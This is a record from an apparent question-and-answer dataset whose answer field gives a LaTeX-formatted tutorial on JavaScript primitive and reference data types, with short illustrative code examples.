    "answer": "In \\texttt{JavaScript}, data types are a fundamental concept that dictates the kind of values a variable can hold and the operations that can be performed on them. \\texttt{JavaScript} is a dynamically-typed (or weakly-typed) language, meaning variables are not explicitly declared with a type; their type is determined at runtime based on the value they hold. Data types are broadly categorized into two main groups: \\textbf{Primitive Data Types} and \\textbf{Non-Primitive (Reference) Data Types}.\n\n\\section*{Primitive Data Types}\n\\textbf{Primitive data types} represent single, immutable values. When a variable holds a primitive value, it stores the actual value directly. Primitives are also \\textbf{passed by value}, meaning that when a primitive value is assigned to another variable or passed to a function, a copy of the value is created. Any changes to the copy do not affect the original. There are seven primitive data types in \\texttt{JavaScript}:\n\n\\begin{itemize}\n    \\item \\texttt{\\textbf{Number}}: Represents both integer and floating-point numbers. \\texttt{JavaScript} uses a single \\texttt{Number} type based on the IEEE 754 standard for double-precision 64-bit format.\n    \\begin{lstlisting}[language=javascript, caption=Number Examples]\nlet integer = 42;\nlet float = 3.14;\nlet negative = -10;\nlet scientific = 2.5e-3; // 0.0025\nconsole.log(typeof integer); // \"number\"\n    \\end{lstlisting}\n\n    \\item \\texttt{\\textbf{BigInt}}: Introduced in ES2020, \\texttt{BigInt} is a primitive data type that can represent whole numbers larger than $2^{53}-1$ (the largest number \\texttt{Number} can reliably represent). A \\texttt{BigInt} is created by appending \\texttt{n} to the end of an integer literal or by calling the \\texttt{BigInt()} constructor.\n    \\begin{lstlisting}[language=javascript, caption=BigInt Example]\nconst bigNumber = 9007199254740991n; // Add 'n' for BigInt\nconst anotherBigNum = BigInt(\"12345678901234567890\");\nconsole.log(typeof bigNumber); // \"bigint\"\n    \\end{lstlisting}\n\n    \\item \\texttt{\\textbf{String}}: Represents a sequence of characters, enclosed within single quotes (\\texttt{''}), double quotes (\\texttt{\"\"}), or backticks (\\texttt{\\`{}}\\texttt{\\`{}}). Strings are immutable; once created, their content cannot be changed. Operations that appear to modify a string (e.g., concatenation) actually return a new string.\n    \\begin{lstlisting}[language=javascript, caption=String Examples]\nlet name = \"Alice\";\nlet greeting = 'Hello';\nlet message = `Welcome, ${name}!`; // Template literal\nconsole.log(typeof name); // \"string\"\n    \\end{lstlisting}\n\n    \\item \\texttt{\\textbf{Boolean}}: Represents a logical entity and can have two values: \\texttt{true} or \\texttt{false}. It is often used for conditional logic.\n    \\begin{lstlisting}[language=javascript, caption=Boolean Example]\nlet isActive = true;\nlet hasPermission = false;\nconsole.log(typeof isActive); // \"boolean\"\n    \\end{lstlisting}\n\n    \\item \\texttt{\\textbf{Undefined}}: Represents a variable that has been declared but has not yet been assigned a value. It's also the default return value for functions that do not explicitly return anything.\n    \\begin{lstlisting}[language=javascript, caption=Undefined Example]\nlet myVariable;\nconsole.log(myVariable);    // undefined\nconsole.log(typeof myVariable); // \"undefined\"\n    \\end{lstlisting}\n\n    \\item \\texttt{\\textbf{Symbol}}: Introduced in ES6 (ECMAScript 2015), \\texttt{Symbol} is a unique and immutable primitive value that may be used as the key of an object property. Each \\texttt{Symbol} value is unique, even if created with the same description.\n    \\begin{lstlisting}[language=javascript, caption=Symbol Example]\nconst id1 = Symbol('id');\nconst id2 = Symbol('id');\nconsole.log(id1 === id2); // false (they are unique)\nlet user = {\n  [id1]: 123,\n  name: \"Bob\"\n};\nconsole.log(user[id1]); // 123\nconsole.log(typeof id1); // \"symbol\"\n    \\end{lstlisting}\n\n    \\item \\texttt{\\textbf{Null}}: Represents the intentional absence of any object value. It is often used to signify \"no value\" or \"empty.\" It's important to note that \\texttt{typeof null} returns \\texttt{\"object\"}, which is a long-standing bug in \\texttt{JavaScript} but cannot be fixed due to backward compatibility.\n    \\begin{lstlisting}[language=javascript, caption=Null Example]\nlet user = null;\nconsole.log(user);          // null\nconsole.log(typeof user);   // \"object\" (historical bug)\n    \\end{lstlisting}\n\\end{itemize}\n\n\\section*{Non-Primitive (Reference) Data Types}\n\\textbf{Non-primitive data types}, also known as \\textbf{reference data types}, are used to store collections of data and more complex entities. Unlike primitives, which store the actual value, non-primitives store a \\textbf{reference} (memory address) to where the object is stored in memory. This means they are \\textbf{passed by reference}. When a non-primitive value is assigned to another variable or passed to a function, only the reference is copied, not the actual object. Consequently, if the object is modified through one reference, the changes will be visible through all references pointing to the same object. The primary non-primitive data type in \\texttt{JavaScript} is \\texttt{\\textbf{Object}}.\n\n\\begin{itemize}\n    \\item \\texttt{\\textbf{Object}}: This is the most complex data type and the base for all non-primitive types. An object is a collection of key-value pairs (properties and methods). Key examples of built-in objects include:\n    \\begin{itemize}\n        \\item \\texttt{\\textbf{Plain Objects}}: General-purpose objects created using object literals \\texttt{\\{\\}} or the \\texttt{Object} constructor.\n        \\item \\texttt{\\textbf{Arrays}}: Ordered collections of values, indexed by numbers. Syntactically, they are objects with special properties (like \\texttt{length}).\n        \\item \\texttt{\\textbf{Functions}}: Callable objects that encapsulate a block of code. Functions are first-class citizens in \\texttt{JavaScript}, meaning they can be assigned to variables, passed as arguments, and returned from other functions.\n        \\item \\texttt{\\textbf{Dates}}: Objects for working with dates and times.\n        \\item \\texttt{\\textbf{RegExp}} (Regular Expressions): Objects for pattern matching with text.\n    \\end{itemize}\n\n    \\begin{lstlisting}[language=javascript, caption=Object Examples]\n// Plain Object\nlet person = {\n  firstName: \"Jane\",\n  lastName: \"Doe\",\n  age: 30\n};\nconsole.log(typeof person); // \"object\"\n\n// Array (is an object)\nlet colors = [\"red\", \"green\", \"blue\"];\nconsole.log(typeof colors); // \"object\"\n\n// Function (is an object)\nfunction greet() {\n  console.log(\"Hello!\");\n}\nconsole.log(typeof greet); // \"function\" (specialized object type)\n    \\end{lstlisting}\n\n    The \\textbf{pass-by-reference} behavior is crucial to understand for objects:\n    \\begin{lstlisting}[language=javascript, caption=Pass-by-Reference Example]\nlet obj1 = { value: 10 };\nlet obj2 = obj1; // obj2 now points to the SAME object as obj1\n\nobj2.value = 20; // Modifying obj2's property\n\nconsole.log(obj1.value); // Outputs: 20 (obj1 sees the change)\nconsole.log(obj1 === obj2); // Outputs: true (they point to the same object)\n    \\end{lstlisting}\n\\end{itemize}\n\n\\section*{Key Differences}\nThe fundamental distinction lies in how these types are stored and manipulated:\n\\begin{itemize}\n    \\item \\textbf{Storage}: Primitives store their actual value directly in the variable. Non-primitives store a reference (memory address) to the object's location.\n    \\item \\textbf{Mutability}: Primitives are \\textbf{immutable}; their value cannot be changed after creation. Any operation that seems to change a primitive actually creates a new primitive. Non-primitives are \\textbf{mutable}; their properties and contents can be changed after creation.\n    \\item \\textbf{Comparison}: Primitive values are compared by their value. Non-primitive values are compared by their reference; two objects are only considered equal if they point to the exact same object in memory.\n\\end{itemize}\nUnderstanding these distinctions is vital for writing correct and predictable \\texttt{JavaScript} code.",
